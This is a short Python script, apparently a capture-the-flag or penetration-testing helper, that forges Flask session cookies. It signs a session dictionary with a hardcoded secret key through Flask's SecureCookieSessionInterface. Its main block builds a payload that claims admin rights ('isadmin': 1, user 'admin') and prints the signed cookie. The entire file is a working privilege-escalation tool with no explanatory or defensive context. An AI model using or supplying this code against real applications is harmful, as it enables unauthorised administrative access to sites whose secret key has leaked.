from flask.sessions import SecureCookieSessionInterface
import ast

class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key

def encode(secret_key, session_cookie_structure):
    try:
        app = MockApp(secret_key)
        session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
        si = SecureCookieSessionInterface()
        s = si.get_signing_serializer(app)
        return s.dumps(session_cookie_structure)
    except Exception as e:
        print(e)
        return False

if __name__ == "__main__":
    payload = "{'isadmin': 1, 'user': (1, 'admin', 'admin@admin.com')}"
    key = 'dd1b89738ced07b8529fcffd552025bb'
    print(encode(key, payload))